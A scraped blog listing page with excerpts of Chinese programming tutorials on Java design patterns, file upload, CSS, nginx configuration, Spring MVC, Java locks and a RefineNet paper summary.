		前言：
👏作者简介：我是笑霸final，一名热爱技术的在校学生。
📝个人主页：个人主页1 || 笑霸final的主页2
📕系列专栏：计算机基础专栏
📧如果文章知识点有错误的地方，请指正！和大家一起学习，一起进步👀
🔥如果感觉博主的文章还不错的话，👍点赞👍 + 👀关注👀 + 🤏收藏🤏
工厂模式 简介一、简单工厂模式1.1定义Car接口1.2写多个车类并实现Car接口1.3创建工厂方法1.4创建消费者来获取车1.5我们来消除工厂方法的if-else 二、工厂方法模式2.1Car接口和工厂接口2.2对应的车工厂2.3消费者获取车 对比 简介 工厂模式（Factory Pattern）是 Java 中最常用的设计模式之一。这种类型的设计模式属于创建型模式，它提供了一种创建对象的最佳方式。
工厂模式提供了一种将对象的实例化过程封装在工厂类中的方式。通过使用工厂模式，可以将对象的创建与使用代码分离，提供一种统一的接口来创建不同类型的对象。
在工厂模式中，我们在创建对象时不会对客户端暴露创建逻辑，并且是通过使用一个共同的接口来指向新创建的对象。
接下来我们就以创建车为例
一、简单工厂模式 目录结构:
1.1定义Car接口 public interface Car { void getInfo(); } 这里我们就简单的写一个方法就行了
1.2写多个车类并实现Car接口 实现一
public class BBCar implements Car { @Override public void getInfo() { System.out.println("BB车"); } } 实现二
public class HQCar implements Car { @Override public void getInfo() { System.out.println("红旗车"); } } 1.3创建工厂方法 public class CarFactory { public static Car getCar(String name){ if("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4a3b9b624549b98b3563b70151e10d59/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/d265d2062c0829874664785c7e3921ae/" rel="bookmark">
			Java文件上传
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、文件上传介绍 1. method请求必须为post
2. enctype属性值必须为multipart/form-data
3. input 类型为type="file" 1.表单提交上传 &lt;form action="/aaa/fileUpload.jsp" enctype="multipart/form-data" method="post"&gt; &lt;input type="text" name="username"&gt; &lt;br&gt;&lt;br&gt; &lt;input type="file" name="fileData"&gt; &lt;br&gt;&lt;br&gt; &lt;button type="submit"&gt;提交文件&lt;/button&gt; &lt;/form&gt; 提交表单上传，会刷新界面，一般不推荐 ，建议使用Ajax异步提交文件上传信息。
2.AJAX提交上传 &lt;script src="https://cdn.bootcdn.net/ajax/libs/jquery/3.6.0/jquery.js"&gt;&lt;/script&gt; &lt;div&gt; 上传文件： &lt;input type="file" onchange="uploadFile(this)"&gt; &lt;/div&gt; &lt;script&gt; function uploadFile(event) { var File = event.files[0]; var formData = new FormData(); formData.append("username", "测试账号123") formData.append("file", File) $.ajax({ url: '/aaa/fileUpload.jsp', type: 'post', data: formData, contentType: false, processData: false, success: function (result) { console.log(result) }, error: function (err) { console.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/d265d2062c0829874664785c7e3921ae/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cf24d675322d550be975d15aea8159cb/" rel="bookmark">
			CSS揭秘：4.边框内圆角
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 边框内圆角一、两个div嵌套div First Try 二、box-shadow + outline 方案box-shadow + outline First Try 最终案例代码 相关阅读 边框内圆角 背景知识：box-shadow，outline，“多重边框”
一、两个div嵌套 两个div实现内圆角很容易，只需要内圆角外直角即可。
div First Try .box{ width: 200px; padding: 20px; background-color: #655; } .content{ background-color: tan; border-radius: .8em; padding: 20px; } 这种方案更加灵活，我们可以在box上设置更多的样式，但是需要两个元素才能实现。
二、box-shadow + outline 方案 还记得上篇中，outline和box-shadow对于圆角的区别显示吗？box-shadow会贴合border的圆角，outline不会。当我们仅需要实现一个实色的边框加内圆角，使用这个方案可以达到相同的效果。
box-shadow + outline First Try width: 160px; background: tan; border-radius: .8em; padding: 20px; margin: 20px; box-shadow: 0px 0px 0px .4em #655; outline: 20px solid #655; 这种方案中，box-shadow是用来填补outline和border之间的间隙的，如果不加box-shadow效果会是这样的。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cf24d675322d550be975d15aea8159cb/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/988a702dc5a2378ac360c1b7a1f05ea2/" rel="bookmark">
			关于Div 高度height: auto 时的计算规则。
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		优先级： 1. height： 首先自身的height属性的优先级最高。
2. content： 被内容的高度撑高，父元素的最小高度会以该内容的高度为准。
1. 注意当子元素为block，flex，grid，table（块元素）时。 1. 且指定了height值，父元素的高度以子元素的height值为准。 2. 若没有指定height值，则以子元素内容高度为准。 2. 当为inline-xxx （行内块元素）类型时。 1. 先以父元素的行高为最小高度。（此为最小高度！） 2. 若没指定height，则以 子元素内容高度 + 父元素的一半行距 为准。 3. 若指定了height，则以 MAX（height，子元素内容高度 + 父元素的一半行距） 为准。 *： 半行距 = ( 行高 - 字体大小 ) / 2 3. 行内元素取 父元素行高为最小高度，若子元素内容的高度大，则以较大值作为高度。 3. line-height： 次以自身的行高作为最小高度的计算值。
4. Font-size: 类似line-height ，弱于line-height的优先级
总结整体优先级 自身height &gt; 子元素为block且指定了高度 &gt; 子元素为block时内容的高度 &gt; 其他
其他包括子元素为行内，行内块， 自身的line-height ( font-size ) 等。
会以line-height，font-size为最小高度，然后谁大取谁。（最后一部分优先级较为麻烦，不便记忆，以实际效果为准。）
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2143b54c9fa7a56bbd9e0930d90b53cc/" rel="bookmark">
			Html2Canvas 常见问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 文字样式丢失且都变成为最小号字体。 解决方案： 需要截图的节点根样式添加font-variant: normal；
2. 文字向下偏移。 解决方案： 指定html2canvas的版本号为1.0.0-alpha.12
3. 不完整，缺失，留白。 出现情况： 当截图区域超过视图高度，且滚动条未处在顶部时，会出现。
解决方案： 截图之前控制滚动条至顶部。
4. 模糊，不清晰。 出现情况： 通常是图片设置为背景的情况下，截图会比较模糊。
解决方案： 将背景图通过img标签加定位的方式实现。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5ec513656fbcd1dd7a9f9ebd5661bb4b/" rel="bookmark">
			k8s nginx.conf 配置文件如下
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		k8s nginx 配置文件如下：
nginx.conf 文件： events { worker_connections 1024; } http { include /etc/nginx/mime.types; default_type application/octet-stream; log_format main '$remote_addr - $remote_user [$time_local] "$request" ' '$status $body_bytes_sent "$http_referer" ' '"$http_user_agent" "$http_x_forwarded_for"'; access_log /var/log/nginx/access.log; error_log /var/log/nginx/error.log; sendfile on; #tcp_nopush on; keepalive_timeout 65; #gzip on; include /etc/nginx/conf.d/*.conf; # C++网关 server { listen 30001; add_header Strict-Transport-Security "max-age=31536000; includeSubDomains"; add_header X-XSS-Protection "1; mode=block"; add_header X-Frame-Options "SAMEORIGIN always"; add_header X-Content-Type-Options "nosniff"; # 转发websocket需要的设置 proxy_set_header X-Real_IP $remote_addr; proxy_set_header Host $host; proxy_set_header X_Forward_For $proxy_add_x_forwarded_for; proxy_http_version 1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5ec513656fbcd1dd7a9f9ebd5661bb4b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8262cf68395366b13cd930b8d20cd527/" rel="bookmark">
			金三银四好时节，python面试10K&#43;能不能得到？
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		嗨害大家好鸭！我是小熊猫~ 金三银四好时节，面试10K+能不能得到？
这次正逢面试季，这次给大家带来一个真实面试题
虽然最后上的班不一定是自己喜欢的，
但是工作还是要有哇！
第三方库: requests &gt;&gt;&gt; pip install requests
parsel &gt;&gt;&gt; pip install parsel
安装python第三方模块:
win + R 输入 cmd 点击确定, 输入安装命令 pip install 模块名 (pip install requests) 回车
在pycharm中点击Terminal(终端) 输入安装命令
开发环境: 版 本: python 3.8
编辑器: pycharm 2021.2
540305994
原理:
模拟 浏览器 向 服务器 发送网络请求(访问网站)
基本思路 实现案例:
分析数据来源
静态页面(数据来源 = 当前浏览器里面的网址)
代码实现:
1.发送请求
2.获取数据
3.解析数据(我需要的内容取出来 餐厅名称 评分 评价人数 地址 电话)
4.保存数据
代码展示 导入模块
# Python里面有非常多的第三方工具 # 内置工具也有很多 import requests # 发送请求 第三方模块 import parsel # 解析数据 第三方模块 伪装 Python 字典容器
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8262cf68395366b13cd930b8d20cd527/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8cee3e308ef9cf16afcfe3240d3e7762/" rel="bookmark">
			JDK19 - 虚拟线程详解
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		JDK19 - 虚拟线程详解 前言一. Continuation 和 虚拟线程1.1 Continuation 案例1.2 Continuation 内的重要成员1.3 run() 执行/恢复执行1.4 yield() 暂停执行1.5 测试和小总结 二. VirtualThread 解读2.1 VirtualThread 内的重要成员和构造2.2 VirtualThread 的首次执行2.3 结束阻塞再次调度2.4 跟着Debug走一遍 前言 之前在 Virtual Thread 虚拟线程探究 这篇文章里面主要讲了一下虚拟线程的使用和简要的介绍。这篇文章我们就来深入学习一下相关的原理。
虚拟线程的实现可以由两个部分组成：
Continuation：一种提供执行和暂停函数的服务类。Scheduler：执行器。负责将虚拟线程挂载到平台线程上。底层交给ForkJoinPool执行。 一. Continuation 和 虚拟线程 虚拟线程的实现，底层重度依赖于Continuation这个类的实现。
Loom的愿景是啥？write sync run async。那遇到同步阻塞（write sync）的时候怎么办？将底层切换为异步非阻塞（run async）。异步事件处理完了之后怎么办？需要切回原先的代码点继续执行。 从上面可以发现，有两个重要的功能点就是：
同步切异步：暂停执行。异步处理完毕时切同步：恢复执行。 虚拟线程会把调度任务包装到一个Continuation 实例中，在里面主要完成上面两件事情 ：
当任务需要阻塞挂起的时候，调用 Continuation 的yield操作进行阻塞。任务需要解除阻塞继续执行的时候，则调用 Continuation 的run恢复执行。 1.1 Continuation 案例 我们用一个简单的案例，让大家直观的感受到Continuation的作用和神奇之处。不过在此之前，Continuation属于非常底层的一种API，常规情况下，我们无法直接调用，因此我们在编写测试用例的时候，需要添加相关的参数。我们给Java Compiler添加以下参数：
--add-exports java.base/jdk.internal.vm=ALL-UNNAMED 如图：
代码如下：
@org.junit.Test public void testContinuation(){ ContinuationScope scope = new ContinuationScope("
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8cee3e308ef9cf16afcfe3240d3e7762/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/da0dce4f2ea31f58b40e2337743b761b/" rel="bookmark">
			Java学习笔记
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、基础 1.1 基本数据类型 基本类型大小（字节）包装类型默认包装类型常量池byte1Byte0-128~127short2Short0-128~127int4Integer0-128~127long8Long0L-128~127float4Float0f-double8Double0d-boolean-Booleanfalsetrue、falsechar2Character‘u0000’0~127 1.2 类的初始化顺序 存在继承的情况下，初始化顺序为：
父类（静态变量、静态语句块）子类（静态变量、静态语句块）父类（实例变量、普通语句块）父类（构造函数）子类（实例变量、普通语句块）子类（构造函数） 1.3 重载和重写 重载就是同样的一个方法能够根据输入数据的不同，做出不同的处理
重写就是当子类继承自父类的相同方法，输入数据一样，但要做出有别于父类的响应时，你就要覆盖父类方法
重载：发生在同一个类中（或者父类和子类之间），方法名必须相同，参数类型不同、个数不同、顺序不同，方法返回值和访问修饰符可以不同。
重写：
返回值类型、方法名、参数列表必须相同，抛出的异常范围小于等于父类，访问修饰符范围大于等于父类。如果父类方法访问修饰符为 private/final/static 则子类就不能重写该方法，但是被 static 修饰的方法能够被再次声明。构造方法无法被重写 1.4 泛型 1.4.1 泛型类 //此处T可以随便写为任意标识，常见的如T、E、K、V等形式的参数常用于表示泛型 //在实例化泛型类时，必须指定T的具体类型 public class Generic&lt;T&gt; { private T key; public Generic(T key) { this.key = key; } public T getKey() { return key; } } 1.4.2 泛型接口 public interface Generator&lt;T&gt; { public T method(); } //实现1：不指定类型 class GeneratorImpl&lt;T&gt; implements Generator&lt;T&gt;{ @Override public T method() { return null; } } //实现2:指定类型 class GeneratorImpl implements Generator&lt;String&gt;{ @Override public String method() { return "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/da0dce4f2ea31f58b40e2337743b761b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ec140efa9ca45f6f770f0cf48658aff8/" rel="bookmark">
			Python学习指南（看完不迷路）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		作为大数据和人工智能时代的必备语言，Python 优点颇多，它语言简洁、开发效率高、可移植性强，经过多年的生态建设，Python 有了大量的函数库，尤其在数据分析和科学计算领域。另外，函数在 Python 中是一等公民，所以 Python 同时也是一种函数式编程语言。
为了在大数据和 AI 时代更具竞争力，学 Python 的程序员越来越多，甚至不少人把 Python 当作第一语言来学习。许多人觉得 Python 功能强大还上手轻松，学习曲线也没那么陡峭，得来全不费工夫。但是，推开Python的大门你会发现，Python入门容易但精通很难。看似语法记得滚瓜烂熟，但一进入实际项目，就被打回了原型。
比如，你要去做一个电商后台，存储着每件产品的ID、名称和价格。现在需要根据商品ID找出价格，如何使用最合适的数据结构呢？在 Python中字典、集合都是经过高度性能优化的数据结构，如果采用列表来存储数据并进行查找，时间复杂度是多少？换成字典呢？哪个更高效？
再比如，Python中的协程和线程有什么区别？生成器如何进化成协程？并发编程中的 future 和 asyncio有什么关系？如何写出线程安全的高性能代码呢？
据我所知，不少入门者都卡在了这里，前进无能。而不得不说，解决这些问题，是一名合格 Python 工程师的基本能力。也有不少粉丝让我推荐一些好的学习资料，恰好我在极客时间上看到了刚上线的专栏《Python核心技术与实战》，Facebook一线资深工程师带你系统掌握 Python，希望带你从工程的角度，重新理解 Python，做到真正的“即学即用”。
1.Python基础入门 必学知识：【Python基础数据结构】【Python基础语法】【文件操作】【错误与异常处理】【Python面向对象】【模块化】
第一步，你必然需要掌握的Python基础知识。这个专栏不仅仅只讲基础概念、操作，同时也为你整理了很多进阶难度的知识，或是一些重难点、易错点等需要注意的地方。
(基础篇目录）
2.Python进阶核心知识 必学知识：【Python协议】【Python高级语法】【Python正则表达式】【Python并发编程】【垃圾回收机制】【项目实战】
第二步，进阶 Python 的核心知识点，比如装饰器、并发编程等等。如果你的工作只是写100行以下的脚本程序，可能不怎么会用得到。但如果你做的是大型程序的开发，则非常有必要。
（进阶篇目录）
3.规范：编写高质量的Python程序 这部分着重于教你把程序写得更加规范、更加稳定，**用具体的编程操作和技巧，教你提高代码质量。**比如，如何合理地分解代码、运用 assert，如何写单元测试等等。
（规范篇目录）
4.Python实战，串联整个知识体系：带你搭建量化交易系统
必学知识点：【RESTful】【Socket】【Pandas】【Numpy】【Kafka】【RabbitMQ】【MySQL】【Django】
真正要 掌握一门编程语言，仅仅学会分散的知识点是不够的，还必须要把知识点串联起来，做一些中型的项目才能有更深的领悟与提高 。这部分，景霄用量化交易系统这个具体的实战案例，带你综合运用前面所学的Python知识。
（实战篇目录）
关于Python技术储备 学好 Python 不论是就业还是做副业赚钱都不错，但要学会 Python 还是要有一个学习规划。最后大家分享一份全套的 Python 学习资料，给那些想学习 Python 的小伙伴们一点帮助！
包括：Python激活码+安装包、Python web开发，Python爬虫，Python数据分析，人工智能、机器学习等习教程。带你从零基础系统性的学好Python！
👉Python学习路线汇总👈 Python所有方向的技术点做的整理，形成各个领域的知识点汇总，它的用处就在于，你可以按照上面的知识点去找对应的学习资源，保证自己学得较为全面。（全套教程文末领取哈）
👉Python必备开发工具👈 温馨提示：篇幅有限，已打包文件夹，获取方式在：文末
👉Python学习视频600合集👈 观看零基础学习视频，看视频学习是最快捷也是最有效果的方式，跟着视频中老师的思路，从基础到深入，还是很容易入门的。
👉实战案例👈 光学理论是没用的，要学会跟着一起敲，要动手实操，才能将自己的所学运用到实际当中去，这时候可以搞点实战案例来学习。
👉100道Python练习题👈 检查学习结果。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/ec140efa9ca45f6f770f0cf48658aff8/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c264dc2c18ba9fccb69276d261e8c7a0/" rel="bookmark">
			免费的ssl证书
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		免费的SSL证书对于保证网站的安全性和信任度来说是非常重要的。虽然有些人可能会认为，免费的SSL证书可能不如付费的证书有效，但事实并非如此。
首先，免费的SSL证书同样能够为网站提供加密与解密的功能。这意味着所有的数据将会在传输过程中被加密，从而保护用户的个人信息和敏感数据不被窃取。因此，对于那些希望在网站上进行在线支付、提交表单或其他敏感交互的企业和个人来说，使用免费的SSL证书是值得的。
其次，免费的SSL证书同样能够提供信任和验证的功能。虽然免费的证书提供者可能没有像付费证书提供者那样严格的身份验证流程，但他们仍然会验证网站的所有权，以确保该站点真实可靠。而且，大多数现代浏览器都会默认信任这些免费证书，因此用户在使用时不会出现安全警告。
当然，免费的SSL证书也存在一些限制和局限性。首先，免费证书的颁发机构通常不会提供与付费证书相同的技术支持。如果在安装或配置证书时遇到问题，可能需要投入更多的时间和精力来解决。此外，免费证书的有效期一般较短，通常只有数个月，因此网站管理员需要定期更新证书以保持网站的安全性。
然而，对于大多数个人博客、小型企业或刚开始建立在线业务的网站来说，使用免费的SSL证书已经足够了。这样他们可以在有限的预算下获得基本的安全保护，并为用户提供可信赖的服务。随着业务的发展和需求的增长，他们始终可以选择升级到付费证书，以获得更多的技术支持和额外的安全功能。
综上所述，免费的SSL证书在一定程度上是管用的。虽然它们可能不具备与付费证书完全相同的特性和优势，但对于那些预算有限的个人和小型企业来说，免费证书提供了基本的加密和信任功能。然而，对于更大规模、更重要的商业网站来说，可能还是更建议选择付费的SSL证书来确保更高的安全性和更完善的技术支持。
JoySSL官网
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bc69894254fe14eed67678278d9dea4f/" rel="bookmark">
			【框架篇】Spring MVC 介绍及使用（详细教程）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Spring MVC 介绍 1，MVC 设计模式 MVC（Model-View-Controller）是一种常见的软件设计模式，用于将应用程序的逻辑分离成三个独立的组件：
模型（Model）：模型是应用程序的数据和业务逻辑的表示。它负责处理数据的读取、存储和操作，以及业务规则的处理。模型通常是独立于用户界面的，可以在不同的视图和控制器之间共享和重用。视图（View）：视图是用户界面的呈现部分，负责展示数据给用户，并接收用户的输入。视图通常是根据模型的数据进行渲染和更新的，它可以是Web页面、图形界面或命令行界面等。控制器（Controller）：控制器是模型和视图之间的协调者，负责接收用户的输入并根据输入调用相应的模型逻辑。控制器将用户的请求转发给模型进行处理，并将处理结果传递给视图进行展示。控制器还可以处理视图的事件和状态变化。 MVC设计模式的作用如下：
分离关注点：MVC将应用程序的不同关注点（数据、业务逻辑、用户界面）分离开来，使得各个组件可以独立开发、测试和维护，提高了代码的可读性和可维护性。提高可重用性：通过将数据和业务逻辑抽象成模型，可以在不同的视图和控制器之间共享和重用，减少了重复编写代码的工作量。改善可扩展性：MVC模式使得各个组件之间的耦合度降低，可以更方便地对应用程序进行扩展和修改，而不会影响其他组件的功能。改善用户体验：通过将用户界面和业务逻辑分离，MVC模式使得用户界面更加灵活和响应，可以根据不同的需求进行定制和优化。 总的来说，MVC设计模式通过将应用程序的逻辑分离成模型、视图和控制器，提供了一种结构化的开发方式，使得代码更加可读、可维护和可扩展，同时改善了用户体验和开发效率。
2，Spring MVC 2.1，Spring MVC 的介绍 Spring Web MVC是基于Servlet API构建的原始Web框架，也是Spring框架的一部分。它提供了灵活可扩展的MVC架构，方便开发者构建高性能的Web应用程序，并与 Spring 生态系统无缝集成。
2.2，Spring MVC与MVC的关系 Spring MVC与MVC之间的关系的要点总结：
Spring MVC是一个Web框架，而MVC是一种架构模式。Spring MVC是基于MVC模式的实现之一。MVC是一种将应用程序的不同方面分离的设计模式，包括模型（Model）、视图（View）和控制器（Controller）。Spring MVC遵循MVC设计模式，将应用程序的不同方面分离开来，通过模型、视图和控制器的协作来处理Web请求。 综上所述，Spring MVC是Spring框架提供的基于MVC架构并继承了Servlet API的Web开发框架。它遵循MVC模式的原则，提供了一套完整的开发流程和特性。通过Spring框架的支持，它能够实现灵活性、可配置性和可扩展性，帮助开发者构建高性能的Web应用程序。
注意：既然是 Web框架，那么当用户在浏览器中输入了url之后，我们的Spring MVC 项目就可以感知到用户的请求。
2.3，Spring MVC 的重要性 现在的项目大部分Java项目都是基于Spring或者Spring Boot的，而Spring 的核心就是Spring MVC。
简单来说，Spring MVC是一切项目的基础，我们以后创建的所有Spring、Spring Boot项目基本都是基于Spring MVC的。
在创建Spring Boot项目时，我们勾选的Spring Web框架其实就是Spring MVC框架。
学习Spring MVC，我们只需要掌握以下3个功能：
1.连接的功能︰将用户（浏览器）和 Java 程序连接起来，也就是访问一个地址能够调用到我们的Spring程序。
2.获取参数的功能︰用户访问的时候会带一些参数，在程序中要想办法获取到参数。
3.输出数据的功能︰执行了业务逻辑之后，要把程序执行的结果返回给用户。
3，Spring MVC 创建和使用 3.1，Spring MVC创建 Spring MVC项目的创建方式有2种，分别为：
使用Maven项目添加 Spring MVC框架依赖的方式创建使用Spring Boot的方式创建Spring MVC 项目 由于第一种方式中的过程较复杂，而第二种方式较为简单，故在2018年以后基本都是使用第二种方式来进行创建Spring MVC项目。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bc69894254fe14eed67678278d9dea4f/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/af44601c36e1881cfca5f66e6028864c/" rel="bookmark">
			javax.servlet.ServletException: Servlet[dispatcher]的Servlet.init（）引发异常----解决方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
javax.servlet.ServletException: Servlet[dispatcher]的Servlet.init（）引发异常----解决方法
问题：报500错： 解决方法
运行结果
javax.servlet.ServletException: Servlet[dispatcher]的Servlet.init（）引发异常----解决方法 问题：报500错： 类型 异常报告 消息 Servlet[dispatcher]的Servlet.init（）引发异常 描述 服务器遇到一个意外的情况，阻止它完成请求。 例外情况 javax.servlet.ServletException: Servlet[dispatcher]的Servlet.init（）引发异常 org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:492) org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:93) org.apache.catalina.valves.AbstractAccessLogValve.invoke(AbstractAccessLogValve.java:673) org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:360) org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:399) org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:63) org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:926) org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1791) org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49) org.apache.tomcat.util.threads.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1191) org.apache.tomcat.util.threads.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:659) org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61) java.base/java.lang.Thread.run(Thread.java:1589) 根本原因。 org.springframework.beans.factory.BeanDefinitionStoreException: Failed to read candidate component class: file [D:\CS\TomCat\apache-tomcat-9.0.72-windows-x64\apache-tomcat-9.0.72\webapps\springMVC_demo_war\WEB-INF\classes\com\dong\controller\UserController.class]; nested exception is org.springframework.core.NestedIOException: ASM ClassReader failed to parse class file - probably due to a new Java class file version that isn't supported yet: file [D:\CS\TomCat\apache-tomcat-9.0.72-windows-x64\apache-tomcat-9.0.72\webapps\springMVC_demo_war\WEB-INF\classes\com\dong\controller\UserController.class]; nested exception is java.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/af44601c36e1881cfca5f66e6028864c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/91c6a40befb6b12779b8620e37770e03/" rel="bookmark">
			【Java多线程】【锁策略】
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录
概念
1、 悲观锁 VS 乐观锁
2、轻量级锁 VS 重量级锁
3、自旋锁 VS 挂起等待锁
4、互斥锁 VS 读写锁
5、 公平锁 VS 非公平锁
6、可重入锁 VS 不可重入锁 概念 锁策略是在并发编程中用于管理共享资源的一种技术。
当多个线程同时访问共享资源时，可能会出现数据竞争的情况，即多个线程同时读取或修改同一个数据，导致数据的不一致或不可预测性；
作用：通过对共享资源加锁的方式，使得每个线程在访问该资源时都必须先获取锁，然后才能进行读写操作，以保证多个线程之间的数据一致性； 1、 悲观锁 VS 乐观锁 锁的竞争，多个线程对一个对象加锁，会产生阻塞等待，针对这个冲突产生的概率就是实现不同锁的策略
1. 悲观锁：一种较为保守的锁策略，默认认为并发访问会导致冲突，因此在访问共享资源时先获取锁，然后进行操作，操作完成后再释放；
通常使用互斥锁等阻塞锁实现；
优点：可以避免数据冲突；
缺点：获取锁过程中需要阻塞线程，因此会导致系统资源和浪费和性能的下降；
适用：并发冲突比较频繁的场景；高并发的写操作
2. 乐观锁：一种较为开放的锁策略，默认认为并发访问不会导致冲突，因此在进行操作时不先获取锁，而是先读取共享资源的版本号或时间戳等标识信息，然后进行操作，操作完成后再比较标识信息是否发生了变化，未变化则提交操作，否则重新尝试；
通常使用版本号或时间戳等乐观锁控制机制实现
优点：避免线程的阻塞，提高了系统的并发性能
缺点：采用了CAS，可能存在ABA问题（某时间点上共享资源的标识信息发生了两次想同的变化）
适用：并发冲突比较少；高并发的读操作
Synchronized 加锁 初始使用乐观锁策略. 当发现锁竞争比较频繁的时候, 就会自动切换成悲观锁策略.
2、轻量级锁 VS 重量级锁 Java中的轻量级锁和重量级锁是两种内置锁（synchronized）的实现方式，用于控制并发访问共享资源的情况。
1. 轻量级锁：是一种基于自旋锁实现的锁策略，目标是优化低并发情况下的锁操作性能；
加锁解锁，过程更快更高效；
优点：自旋等待，减少线程上下文切换和阻塞等待的开销，适用于低并发场景；
缺点：自旋次数过多，或其他线程竞争激烈时，性能下降；
2. 重量级锁：基于操作系统互斥锁实现的锁策略，目标为了保证锁操作的正确性和安全性
加锁解锁，过程更慢，更低效；
优点：阻塞等待，避免线程饥饿和死锁问题，适用于高并发；
缺点：线程阻塞和唤醒开销大，容易引起线程上下文切换，降低性能；
synchronized 开始是一个轻量级锁. 如果锁冲突比较严重, 就会变成重量级锁.
synchronized 中的轻量级锁策略大概率就是通过自旋锁的方式实现的.
3、自旋锁 VS 挂起等待锁 Java中的自旋锁和挂起等待锁是两种锁的实现方式，用于控制并发访问共享资源的情况。 1.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/91c6a40befb6b12779b8620e37770e03/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/489fc7ddc1e6fc7f759f6256ce07b3c9/" rel="bookmark">
			第九章：RefineNet——多路径细化网络用于高分辨率语义分割
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		&amp;原文信息 原文题目：《RefineNet: Multi-Path Refinement Networks for High-Resolution Semantic Segmentation》
原文引用：Lin G, Milan A, Shen C, et al. Refinenet: Multi-path refinement networks for high-resolution semantic segmentation[C]//Proceedings of the IEEE conference on computer vision and pattern recognition. 2017: 1925-1934.
原文链接：https://openaccess.thecvf.com/content_cvpr_2017/papers/Lin_RefineNet_Multi-Path_Refinement_CVPR_2017_paper.pdfhttps://openaccess.thecvf.com/content_cvpr_2017/papers/Lin_RefineNet_Multi-Path_Refinement_CVPR_2017_paper.pdf
0.摘要 最近，非常深的卷积神经网络（CNN）在目标识别方面表现出色，并且也是密集分类问题（如语义分割）的首选。然而，在深度CNN中，重复的子采样操作（如池化或卷积跳跃）会导致初始图像分辨率的显著降低。因此，我们提出了RefineNet，这是一个通用的多路径细化网络，明确利用沿着降采样过程可用的所有信息，通过长程残差连接实现高分辨率预测。通过这种方式，能够直接利用较早卷积层的细粒度特征来精确调整捕获高级语义特征的深层。RefineNet的各个组件都采用了残差连接，遵循恒等映射的思想，从而实现了有效的端到端训练。此外，我们引入了链式残差池化，以高效地捕捉丰富的背景上下文。我们进行了全面的实验，并在七个公共数据集上取得了最新的最优结果。特别是，在具有挑战性的PASCAL VOC 2012数据集上，我们取得了83.4的交并比分数，这是迄今为止报道的最好结果。
